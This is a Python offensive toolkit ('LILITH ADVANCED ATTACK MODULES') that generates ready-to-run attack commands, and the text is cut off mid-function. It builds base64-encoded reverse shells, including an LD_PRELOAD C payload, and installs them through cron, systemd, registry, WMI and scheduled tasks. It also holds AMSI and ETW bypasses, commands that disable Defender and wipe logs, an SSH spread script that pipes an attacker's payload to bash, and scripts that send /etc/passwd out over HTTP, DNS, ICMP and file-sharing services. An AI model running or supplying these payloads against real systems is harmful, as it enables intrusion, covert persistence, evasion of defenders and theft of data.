#!/usr/bin/env python3
"""
LILITH ADVANCED ATTACK MODULES v1.0
===================================
Real implementations for:
- Persistence Mechanisms
- Defense Evasion Techniques
- Lateral Movement
- Data Exfiltration

WARNING: For authorized security testing only!
"""

import os
import sys
import base64
import hashlib
import random
import string
import socket
import struct
import time
import json
import subprocess
from typing import Dict, List, Optional, Tuple
from datetime import datetime

sys.path.insert(0, '/app/tools')


# =============================================================================
# PERSISTENCE MODULE - Maintain Access
# =============================================================================

class PersistenceModule:
    """
    Real persistence techniques for maintaining access.
    Covers Linux and Windows systems.
    """
    
    @staticmethod
    def linux_cron_persistence(lhost: str, lport: int, interval: str = "*/5 * * * *") -> Dict[str, str]:
        """Generate cron-based persistence"""
        reverse_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        encoded = base64.b64encode(reverse_shell.encode()).decode()
        
        return {
            'name': 'Cron Job Persistence',
            'description': 'Adds reverse shell to cron for periodic callback',
            'commands': {
                'user_cron': f'''(crontab -l 2>/dev/null; echo "{interval} bash -c 'echo {encoded}|base64 -d|bash'") | crontab -''',
                'system_cron': f'''echo "{interval} root bash -c 'echo {encoded}|base64 -d|bash'" >> /etc/crontab''',
                'cron_d': f'''echo "{interval} root bash -c 'echo {encoded}|base64 -d|bash'" > /etc/cron.d/.update''',
                'anacron': f'''echo "1 5 cron.daily bash -c 'echo {encoded}|base64 -d|bash'" >> /etc/anacrontab'''
            },
            'cleanup': 'crontab -r; rm -f /etc/cron.d/.update'
        }
    
    @staticmethod
    def linux_ssh_persistence(attacker_pubkey: str) -> Dict[str, str]:
        """SSH key-based persistence"""
        return {
            'name': 'SSH Key Persistence',
            'description': 'Adds attacker SSH key for passwordless access',
            'commands': {
                'user_key': f'''mkdir -p ~/.ssh && echo "{attacker_pubkey}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys''',
                'root_key': f'''mkdir -p /root/.ssh && echo "{attacker_pubkey}" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys''',
                'all_users': f'''for dir in /home/*; do mkdir -p "$dir/.ssh" && echo "{attacker_pubkey}" >> "$dir/.ssh/authorized_keys"; done'''
            },
            'cleanup': 'Remove the added key from authorized_keys files'
        }
    
    @staticmethod
    def linux_bashrc_persistence(lhost: str, lport: int) -> Dict[str, str]:
        """Bashrc/profile persistence"""
        payload = f"nohup bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' &>/dev/null &"
        encoded = base64.b64encode(payload.encode()).decode()
        
        return {
            'name': 'Shell Profile Persistence',
            'description': 'Triggers reverse shell on user login',
            'commands': {
                'bashrc': f'''echo "echo {encoded}|base64 -d|bash" >> ~/.bashrc''',
                'bash_profile': f'''echo "echo {encoded}|base64 -d|bash" >> ~/.bash_profile''',
                'profile': f'''echo "echo {encoded}|base64 -d|bash" >> /etc/profile''',
                'profile_d': f'''echo "echo {encoded}|base64 -d|bash" > /etc/profile.d/.update.sh && chmod +x /etc/profile.d/.update.sh'''
            },
            'cleanup': 'Remove added lines from profile files'
        }
    
    @staticmethod
    def linux_systemd_persistence(lhost: str, lport: int, service_name: str = "system-update") -> Dict[str, str]:
        """Systemd service persistence"""
        service_content = f'''[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target'''
        
        encoded = base64.b64encode(service_content.encode()).decode()
        
        return {
            'name': 'Systemd Service Persistence',
            'description': 'Creates persistent systemd service with auto-restart',
            'commands': {
                'create_service': f'''echo "{encoded}" | base64 -d > /etc/systemd/system/{service_name}.service''',
                'enable_service': f'''systemctl daemon-reload && systemctl enable {service_name} && systemctl start {service_name}''',
                'timer_service': f'''echo "[Timer]\\nOnBootSec=1min\\nOnUnitActiveSec=5min\\n[Install]\\nWantedBy=timers.target" > /etc/systemd/system/{service_name}.timer && systemctl enable {service_name}.timer'''
            },
            'cleanup': f'systemctl disable {service_name}; rm /etc/systemd/system/{service_name}.*'
        }
    
    @staticmethod
    def linux_init_persistence(lhost: str, lport: int) -> Dict[str, str]:
        """Init.d/rc.local persistence"""
        payload = f"nohup bash -c 'while true; do bash -i >& /dev/tcp/{lhost}/{lport} 0>&1; sleep 60; done' &"
        encoded = base64.b64encode(payload.encode()).decode()
        
        return {
            'name': 'Init Script Persistence',
            'description': 'Adds to init scripts for boot persistence',
            'commands': {
                'rc_local': f'''echo "echo {encoded}|base64 -d|bash" >> /etc/rc.local && chmod +x /etc/rc.local''',
                'init_d': f'''echo '#!/bin/bash\\necho {encoded}|base64 -d|bash' > /etc/init.d/.update && chmod +x /etc/init.d/.update && update-rc.d .update defaults''',
                'rc_d': f'''ln -s /etc/init.d/.update /etc/rc3.d/S99update'''
            },
            'cleanup': 'Remove scripts and symlinks'
        }
    
    @staticmethod
    def linux_ld_preload_persistence(lhost: str, lport: int) -> Dict[str, str]:
        """LD_PRELOAD shared library persistence"""
        c_code = f'''#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void shell() {{
    if (fork() == 0) {{
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons({lport});
        addr.sin_addr.s_addr = inet_addr("{lhost}");
        connect(sock, (struct sockaddr *)&addr, sizeof(addr));
        dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
        execve("/bin/sh", NULL, NULL);
    }}
}}'''
        encoded = base64.b64encode(c_code.encode()).decode()
        
        return {
            'name': 'LD_PRELOAD Persistence',
            'description': 'Shared library injected into every process',
            'commands': {
                'create_source': f'''echo "{encoded}" | base64 -d > /tmp/.lib.c''',
                'compile': '''gcc -shared -fPIC -o /usr/lib/.libupdate.so /tmp/.lib.c -ldl 2>/dev/null''',
                'install': '''echo "/usr/lib/.libupdate.so" >> /etc/ld.so.preload''',
                'alternative': '''export LD_PRELOAD=/usr/lib/.libupdate.so'''
            },
            'cleanup': 'Remove from /etc/ld.so.preload and delete .so file'
        }
    
    @staticmethod
    def windows_registry_persistence(lhost: str, lport: int) -> Dict[str, str]:
        """Windows registry persistence"""
        ps_payload = f'''powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''
        
        encoded = base64.b64encode(ps_payload.encode('utf-16-le')).decode()
        
        return {
            'name': 'Windows Registry Persistence',
            'description': 'Registry Run keys for boot persistence',
            'commands': {
                'hkcu_run': f'''reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell -enc {encoded}" /f''',
                'hklm_run': f'''reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell -enc {encoded}" /f''',
                'runonce': f'''reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "Update" /t REG_SZ /d "powershell -enc {encoded}" /f''',
                'winlogon': f'''reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "Userinit" /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,powershell -enc {encoded}" /f'''
            },
            'cleanup': 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /f'
        }
    
    @staticmethod
    def windows_scheduled_task_persistence(lhost: str, lport: int) -> Dict[str, str]:
        """Windows Scheduled Task persistence"""
        ps_cmd = f"powershell -nop -w hidden -c \\\"IEX(New-Object Net.WebClient).downloadString('http://{lhost}/shell.ps1')\\\""
        
        return {
            'name': 'Windows Scheduled Task Persistence',
            'description': 'Scheduled task runs at login/interval',
            'commands': {
                'on_logon': f'''schtasks /create /tn "WindowsUpdate" /tr "{ps_cmd}" /sc onlogon /ru System /f''',
                'on_idle': f'''schtasks /create /tn "SystemMaintenance" /tr "{ps_cmd}" /sc onidle /i 10 /f''',
                'every_5min': f'''schtasks /create /tn "HealthCheck" /tr "{ps_cmd}" /sc minute /mo 5 /f''',
                'on_boot': f'''schtasks /create /tn "StartupTask" /tr "{ps_cmd}" /sc onstart /ru System /f'''
            },
            'cleanup': 'schtasks /delete /tn "WindowsUpdate" /f'
        }
    
    @staticmethod
    def windows_wmi_persistence(lhost: str, lport: int) -> Dict[str, str]:
        """WMI Event Subscription persistence"""
        return {
            'name': 'WMI Event Subscription Persistence',
            'description': 'Fileless persistence via WMI events',
            'commands': {
                'event_filter': f'''$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{Name="UpdateFilter";EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"}}''',
                'event_consumer': f'''$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{Name="UpdateConsumer";CommandLineTemplate="powershell -nop -w hidden -c \\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}\\""}}''',
                'binding': '''$Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{Filter=$Filter;Consumer=$Consumer}'''
            },
            'cleanup': 'Get-WmiObject -Class __EventFilter -Namespace "root\\subscription" | Where-Object {$_.Name -eq "UpdateFilter"} | Remove-WmiObject'
        }


# =============================================================================
# DEFENSE EVASION MODULE - Avoid Detection
# =============================================================================

class DefenseEvasionModule:
    """
    Real defense evasion techniques for avoiding detection.
    Includes AMSI bypass, log clearing, process injection, and more.
    """
    
    @staticmethod
    def linux_log_clearing() -> Dict[str, str]:
        """Clear Linux logs to hide activity"""
        return {
            'name': 'Linux Log Clearing',
            'description': 'Remove traces from various log files',
            'commands': {
                'clear_auth': '''echo "" > /var/log/auth.log; echo "" > /var/log/secure''',
                'clear_syslog': '''echo "" > /var/log/syslog; echo "" > /var/log/messages''',
                'clear_wtmp': '''echo "" > /var/log/wtmp; echo "" > /var/log/btmp''',
                'clear_lastlog': '''echo "" > /var/log/lastlog''',
                'clear_history': '''history -c; echo "" > ~/.bash_history; unset HISTFILE''',
                'clear_all': '''for log in /var/log/*.log; do echo "" > "$log" 2>/dev/null; done''',
                'shred_logs': '''shred -zu /var/log/auth.log /var/log/syslog 2>/dev/null''',
                'disable_history': '''export HISTSIZE=0; export HISTFILESIZE=0; unset HISTFILE; set +o history'''
            },
            'stealth_commands': {
                'timestomp': '''touch -r /etc/passwd /path/to/malicious/file''',
                'hide_login': '''utmpdump /var/log/wtmp | grep -v "attacker_ip" | utmpdump -r > /var/log/wtmp'''
            }
        }
    
    @staticmethod
    def linux_process_hiding() -> Dict[str, str]:
        """Hide processes from ps, top, etc."""
        return {
            'name': 'Linux Process Hiding',
            'description': 'Techniques to hide malicious processes',
            'commands': {
                'rename_process': '''exec -a "[kworker/0:0]" /path/to/malicious/binary''',
                'mount_hide': '''mount -o bind /tmp/empty /proc/$(pgrep malicious)''',
                'ld_preload_hide': '''# Requires custom .so that hooks readdir() to filter process'''
            },
            'rootkit_techniques': {
                'description': 'Advanced hiding requires kernel module or LD_PRELOAD rootkit',
                'ld_preload': 'Hook libc functions: readdir, fopen, open, stat to filter results',
                'kernel_module': 'Hide from /proc by hooking kernel syscalls'
            }
        }
    
    @staticmethod
    def linux_timestomping(target_file: str, reference_file: str = "/etc/passwd") -> Dict[str, str]:
        """Modify file timestamps to blend in"""
        return {
            'name': 'Timestomping',
            'description': 'Modify file timestamps to evade forensics',
            'commands': {
                'copy_times': f'''touch -r {reference_file} {target_file}''',
                'set_specific': f'''touch -t 202001011200.00 {target_file}''',
                'touch_atime': f'''touch -a -r {reference_file} {target_file}''',
                'touch_mtime': f'''touch -m -r {reference_file} {target_file}'''
            }
        }
    
    @staticmethod
    def windows_amsi_bypass() -> Dict[str, str]:
        """AMSI (Antimalware Scan Interface) bypass techniques"""
        return {
            'name': 'AMSI Bypass',
            'description': 'Bypass Windows AMSI for PowerShell execution',
            'techniques': {
                'reflection': '''[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)''',
                'patching': '''$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)''',
                'base64_obfuscation': '''$a = 'System.Management.Automation.A]msiUtils' -replace ']',''; $b = [Ref].Assembly.GetType($a); $c = $b.GetField('amsiIn]itFailed' -replace ']','','NonPublic,Static'); $c.SetValue($null,$true)''',
                'forcing_error': '''$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076); [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)'''
            }
        }
    
    @staticmethod
    def windows_defender_evasion() -> Dict[str, str]:
        """Windows Defender evasion techniques"""
        return {
            'name': 'Windows Defender Evasion',
            'description': 'Techniques to evade Windows Defender',
            'commands': {
                'disable_realtime': '''Set-MpPreference -DisableRealtimeMonitoring $true''',
                'add_exclusion': '''Add-MpPreference -ExclusionPath "C:\\Users\\Public"''',
                'disable_scanning': '''Set-MpPreference -DisableIOAVProtection $true''',
                'disable_behavior': '''Set-MpPreference -DisableBehaviorMonitoring $true''',
                'disable_all': '''Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true'''
            },
            'registry': {
                'disable_defender': '''reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f''',
                'disable_tamper': '''reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f'''
            }
        }
    
    @staticmethod
    def windows_etw_bypass() -> Dict[str, str]:
        """Event Tracing for Windows (ETW) bypass"""
        return {
            'name': 'ETW Bypass',
            'description': 'Disable ETW to avoid logging',
            'techniques': {
                'patch_etw': '''$etw = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance'); $etw.SetValue([System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()),$false)''',
                'null_handle': '''[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue($null,$false)'''
            }
        }
    
    @staticmethod
    def windows_log_clearing() -> Dict[str, str]:
        """Clear Windows event logs"""
        return {
            'name': 'Windows Log Clearing',
            'description': 'Clear Windows event logs',
            'commands': {
                'clear_security': '''wevtutil cl Security''',
                'clear_system': '''wevtutil cl System''',
                'clear_application': '''wevtutil cl Application''',
                'clear_powershell': '''wevtutil cl "Windows PowerShell"''',
                'clear_all': '''for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"''',
                'powershell_clear': '''Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }'''
            }
        }
    
    @staticmethod
    def obfuscation_techniques() -> Dict[str, str]:
        """Code obfuscation techniques"""
        return {
            'name': 'Code Obfuscation',
            'description': 'Techniques to obfuscate malicious code',
            'powershell': {
                'string_concat': '''"Inv"+"oke"+"-Exp"+"ression"''',
                'char_array': '''[char[]]@(73,110,118,111,107,101) -join ''  # "Invoke"''',
                'base64': '''[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cGF5bG9hZA=="))''',
                'xor': '''$key = 0x41; $encoded | ForEach-Object { [char]($_ -bxor $key) }''',
                'reverse': '''$cmd = "sserpxE-ekovnI"; iex (-join $cmd[$cmd.Length..0])'''
            },
            'bash': {
                'base64': '''echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash''',
                'hex': '''echo "636174202f6574632f706173737764" | xxd -r -p | bash''',
                'variable_expansion': '''c=c;a=a;t=t;$c$a$t /etc/passwd''',
                'rev': '''echo "dwssap/cte/ tac" | rev | bash'''
            }
        }


# =============================================================================
# LATERAL MOVEMENT MODULE - Spread Through Network
# =============================================================================

class LateralMovementModule:
    """
    Real lateral movement techniques for spreading through networks.
    """
    
    @staticmethod
    def ssh_lateral_movement(target: str, username: str, password: str = None, key_file: str = None) -> Dict[str, str]:
        """SSH-based lateral movement"""
        return {
            'name': 'SSH Lateral Movement',
            'description': 'Move laterally using SSH',
            'commands': {
                'password_auth': f'''sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target}''',
                'key_auth': f'''ssh -i {key_file} -o StrictHostKeyChecking=no {username}@{target}''',
                'execute_remote': f'''ssh {username}@{target} 'bash -s' < local_script.sh''',
                'tunnel': f'''ssh -L 8080:{target}:80 -N {username}@{target}''',
                'dynamic_tunnel': f'''ssh -D 9050 {username}@{target}'''
            },
            'spread_script': f'''#!/bin/bash
# Spread to all known hosts
for host in $(cat ~/.ssh/known_hosts | cut -d' ' -f1 | cut -d',' -f1); do
    ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no $host 'curl http://attacker/payload.sh | bash' &
done'''
        }
    
    @staticmethod
    def smb_lateral_movement(target: str, username: str, password: str = None, hash: str = None) -> Dict[str, str]:
        """SMB-based lateral movement (Windows)"""
        return {
            'name': 'SMB Lateral Movement',
            'description': 'Move laterally using SMB/Windows shares',
            'commands': {
                'psexec': f'''psexec.py {username}:{password}@{target} cmd.exe''',
                'psexec_hash': f'''psexec.py -hashes :{hash} {username}@{target} cmd.exe''',
                'wmiexec': f'''wmiexec.py {username}:{password}@{target}''',
                'smbexec': f'''smbexec.py {username}:{password}@{target}''',
                'atexec': f'''atexec.py {username}:{password}@{target} "whoami"''',
                'dcomexec': f'''dcomexec.py {username}:{password}@{target}'''
            },
            'crackmapexec': {
                'exec_cmd': f'''crackmapexec smb {target} -u {username} -p {password} -x "whoami"''',
                'exec_ps': f'''crackmapexec smb {target} -u {username} -p {password} -X "Get-Process"''',
                'pass_hash': f'''crackmapexec smb {target} -u {username} -H {hash} -x "whoami"''',
                'spray': f'''crackmapexec smb {target}/24 -u users.txt -p passwords.txt'''
            }
        }
    
    @staticmethod
    def winrm_lateral_movement(target: str, username: str, password: str) -> Dict[str, str]:
        """WinRM-based lateral movement"""
        return {
            'name': 'WinRM Lateral Movement',
            'description': 'Move laterally using Windows Remote Management',
            'commands': {
                'evil_winrm': f'''evil-winrm -i {target} -u {username} -p {password}''',
                'powershell': f'''Enter-PSSession -ComputerName {target} -Credential (Get-Credential)''',
                'invoke_command': f'''Invoke-Command -ComputerName {target} -ScriptBlock {{whoami}} -Credential (Get-Credential)''',
                'enable_winrm': '''Enable-PSRemoting -Force; Set-Item wsman:\\localhost\\client\\trustedhosts *'''
            }
        }
    
    @staticmethod
    def rdp_lateral_movement(target: str, username: str, password: str) -> Dict[str, str]:
        """RDP-based lateral movement"""
        return {
            'name': 'RDP Lateral Movement',
            'description': 'Move laterally using Remote Desktop',
            'commands': {
                'xfreerdp': f'''xfreerdp /v:{target} /u:{username} /p:{password} /cert-ignore''',
                'rdesktop': f'''rdesktop -u {username} -p {password} {target}''',
                'enable_rdp': '''reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f''',
                'add_rdp_user': f'''net localgroup "Remote Desktop Users" {username} /add'''
            }
        }
    
    @staticmethod
    def wmi_lateral_movement(target: str, username: str, password: str) -> Dict[str, str]:
        """WMI-based lateral movement"""
        return {
            'name': 'WMI Lateral Movement',
            'description': 'Move laterally using WMI',
            'commands': {
                'wmic_process': f'''wmic /node:{target} /user:{username} /password:{password} process call create "cmd.exe /c whoami > C:\\output.txt"''',
                'impacket_wmi': f'''wmiexec.py {username}:{password}@{target}''',
                'powershell_wmi': f'''Invoke-WmiMethod -ComputerName {target} -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"'''
            }
        }
    
    @staticmethod
    def pass_the_hash(target: str, username: str, ntlm_hash: str) -> Dict[str, str]:
        """Pass-the-Hash attack"""
        return {
            'name': 'Pass-the-Hash',
            'description': 'Authenticate using NTLM hash without password',
            'commands': {
                'pth_winexe': f'''pth-winexe -U {username}%{ntlm_hash} //{target} cmd.exe''',
                'impacket_psexec': f'''psexec.py -hashes :{ntlm_hash} {username}@{target}''',
                'impacket_wmi': f'''wmiexec.py -hashes :{ntlm_hash} {username}@{target}''',
                'mimikatz': f'''sekurlsa::pth /user:{username} /domain:. /ntlm:{ntlm_hash}''',
                'crackmapexec': f'''crackmapexec smb {target} -u {username} -H {ntlm_hash} -x "whoami"'''
            }
        }
    
    @staticmethod
    def pass_the_ticket(target: str, ticket_file: str) -> Dict[str, str]:
        """Pass-the-Ticket (Kerberos) attack"""
        return {
            'name': 'Pass-the-Ticket',
            'description': 'Authenticate using Kerberos ticket',
            'commands': {
                'export_ticket': '''mimikatz# sekurlsa::tickets /export''',
                'import_ticket': f'''export KRB5CCNAME={ticket_file}''',
                'impacket_psexec': f'''KRB5CCNAME={ticket_file} psexec.py -k -no-pass {target}''',
                'rubeus_ptt': f'''Rubeus.exe ptt /ticket:{ticket_file}'''
            }
        }
    
    @staticmethod
    def network_pivoting(pivot_host: str, target_network: str, local_port: int = 9050) -> Dict[str, str]:
        """Network pivoting through compromised host"""
        return {
            'name': 'Network Pivoting',
            'description': 'Use compromised host to access internal networks',
            'commands': {
                'ssh_dynamic': f'''ssh -D {local_port} -N -f user@{pivot_host}''',
                'ssh_local_forward': f'''ssh -L {local_port}:{target_network}:22 user@{pivot_host}''',
                'chisel_server': f'''./chisel server --reverse --port 8080''',
                'chisel_client': f'''./chisel client {pivot_host}:8080 R:socks''',
                'proxychains': f'''proxychains nmap -sT {target_network}''',
                'metasploit_route': f'''route add {target_network} 255.255.255.0 <session_id>'''
            },
            'sshuttle': {
                'full_vpn': f'''sshuttle -r user@{pivot_host} {target_network}/24''',
                'all_traffic': f'''sshuttle -r user@{pivot_host} 0/0'''
            }
        }


# =============================================================================
# EXFILTRATION MODULE - Extract Data
# =============================================================================

class ExfiltrationModule:
    """
    Real data exfiltration techniques.
    Multiple covert channels for extracting data.
    """
    
    @staticmethod
    def http_exfiltration(data: str, exfil_server: str) -> Dict[str, str]:
        """HTTP-based data exfiltration"""
        encoded = base64.b64encode(data.encode()).decode()
        
        return {
            'name': 'HTTP Exfiltration',
            'description': 'Exfiltrate data over HTTP',
            'commands': {
                'curl_post': f'''curl -X POST -d "data={encoded}" http://{exfil_server}/collect''',
                'curl_header': f'''curl -H "X-Data: {encoded}" http://{exfil_server}/''',
                'wget_post': f'''wget --post-data="data={encoded}" http://{exfil_server}/collect''',
                'powershell': f'''Invoke-WebRequest -Uri "http://{exfil_server}/collect" -Method POST -Body @{{data="{encoded}"}}'''
            }
        }
    
    @staticmethod
    def dns_exfiltration(data: str, dns_server: str) -> Dict[str, str]:
        """DNS-based data exfiltration (covert)"""
        # Split data into DNS-safe chunks
        encoded = base64.b64encode(data.encode()).decode().replace('=', '').replace('+', '-').replace('/', '_')
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        
        return {
            'name': 'DNS Exfiltration',
            'description': 'Exfiltrate data via DNS queries (covert)',
            'commands': {
                'nslookup': [f'''nslookup {chunk}.{dns_server}''' for chunk in chunks[:3]],
                'dig': [f'''dig {chunk}.{dns_server}''' for chunk in chunks[:3]],
                'host': [f'''host {chunk}.{dns_server}''' for chunk in chunks[:3]]
            },
            'script': f'''#!/bin/bash
# DNS exfiltration script
data=$(cat /etc/passwd | base64 | tr -d '\\n' | tr '+/' '-_')
for chunk in $(echo $data | fold -w 63); do
    nslookup $chunk.{dns_server} &>/dev/null
    sleep 0.5
done'''
        }
    
    @staticmethod
    def icmp_exfiltration(data: str, exfil_server: str) -> Dict[str, str]:
        """ICMP-based data exfiltration (covert)"""
        return {
            'name': 'ICMP Exfiltration',
            'description': 'Exfiltrate data via ICMP packets',
            'commands': {
                'ping_data': f'''cat /etc/passwd | xxd -p | while read line; do ping -c 1 -p $line {exfil_server}; done''',
                'hping3': f'''cat /etc/passwd | xxd -p | xargs -I {{}} hping3 -1 -e {{}} {exfil_server}'''
            },
            'python_script': f'''import os
from scapy.all import *
data = open('/etc/passwd').read()
for i in range(0, len(data), 48):
    chunk = data[i:i+48]
    send(IP(dst="{exfil_server}")/ICMP()/chunk)'''
        }
    
    @staticmethod
    def https_exfiltration(data: str, exfil_server: str) -> Dict[str, str]:
        """HTTPS-based exfiltration (encrypted)"""
        encoded = base64.b64encode(data.encode()).decode()
        
        return {
            'name': 'HTTPS Exfiltration',
            'description': 'Exfiltrate data over encrypted HTTPS',
            'commands': {
                'curl': f'''curl -k -X POST -d "data={encoded}" https://{exfil_server}/collect''',
                'openssl': f'''echo "{encoded}" | openssl s_client -connect {exfil_server}:443 -quiet''',
                'powershell': f'''[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://{exfil_server}/collect" -Method POST -Body @{{data="{encoded}"}}'''
            }
        }
    
    @staticmethod
    def smb_exfiltration(data_path: str, smb_server: str, share: str = "share") -> Dict[str, str]:
        """SMB-based data exfiltration"""
        return {
            'name': 'SMB Exfiltration',
            'description': 'Exfiltrate data via SMB shares',
            'commands': {
                'smbclient': f'''smbclient //{smb_server}/{share} -N -c "put {data_path}"''',
                'mount_copy': f'''mount -t cifs //{smb_server}/{share} /mnt -o guest && cp {data_path} /mnt/''',
                'net_use': f'''net use Z: \\\\{smb_server}\\{share} && copy {data_path} Z:\\'''
            }
        }
    
    @staticmethod
    def ftp_exfiltration(data_path: str, ftp_server: str, username: str = "anonymous", password: str = "anonymous") -> Dict[str, str]:
        """FTP-based data exfiltration"""
        return {
            'name': 'FTP Exfiltration',
            'description': 'Exfiltrate data via FTP',
            'commands': {
                'curl_ftp': f'''curl -T {data_path} ftp://{username}:{password}@{ftp_server}/''',
                'ftp_script': f'''ftp -n {ftp_server} <<EOF
user {username} {password}
binary
put {data_path}
quit
EOF'''
            }
        }
    
    @staticmethod
    def cloud_exfiltration(data_path: str) -> Dict[str, str]:
        """Cloud service-based exfiltration"""
        return {
            'name': 'Cloud Exfiltration',
            'description': 'Exfiltrate data via cloud services',
            'commands': {
                'pastebin': f'''cat {data_path} | curl -X POST -d "api_paste_code=@-" https://pastebin.com/api/api_post.php''',
                'transfer_sh': f'''curl --upload-file {data_path} https://transfer.sh/''',
                'file_io': f'''curl -F "file=@{data_path}" https://file.io''',
                'anonfiles': f'''curl -F "file=@{data_path}" https://api.anonfiles.com/upload''',
                'discord_webhook': f'''curl -F "file=@{data_path}" https://discord.com/api/webhooks/YOUR_WEBHOOK'''
            }
        }
    
    @staticmethod
    def steganography_exfiltration(data_path: str, image_path: str, output_path: str) -> Dict[str, str]:
        """Steganography-based data hiding"""
        return {
            'name': 'Steganography Exfiltration',
            'description': 'Hide data within images',
            'commands': {
                'steghide_embed': f'''steghide embed -cf {image_path} -ef {data_path} -sf {output_path} -p password''',
                'steghide_extract': f'''steghide extract -sf {output_path} -p password''',
                'outguess': f'''outguess -k "password" -d {data_path} {image_path} {output_path}''',
                'cat_append': f'''cat {image_path} {data_path} > {output_path}'''
            }
        }
    
    @staticmethod
    def archive_and_encrypt(data_path: str, output_path: str, password: str = "infected") -> Dict[str, str]:
        """Archive and encrypt data before exfiltration"""
        return {
            'name': 'Archive & Encrypt',
            'description': 'Compress and encrypt data for exfiltration',
            'commands': {
                'zip_encrypt': f'''zip -r -P {password} {output_path}.zip {data_path}''',
                '7z_encrypt': f'''7z a -p{password} -mhe=on {output_path}.7z {data_path}''',
                'tar_gpg': f'''tar czf - {data_path} | gpg -c --passphrase {password} > {output_path}.tar.gz.gpg''',
                'openssl_enc': f'''tar czf - {data_path} | openssl enc -aes-256-cbc -salt -pass pass:{password} > {output_path}.tar.gz.enc'''
            }
        }
    
    @staticmethod
    def data_staging(target_dirs: List[str] = None) -> Dict[str, str]:
        """Stage data for exfiltration"""
        if target_dirs is None:
            target_dirs = ['/etc', '/home', '/var/www', '/root']
        
        return {
            'name': 'Data Staging',
            'description': 'Identify and stage valuable data',
            'commands': {
                'find_sensitive': '''find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null''',
                'find_passwords': '''grep -r "password" /etc /home /var 2>/dev/null | head -50''',
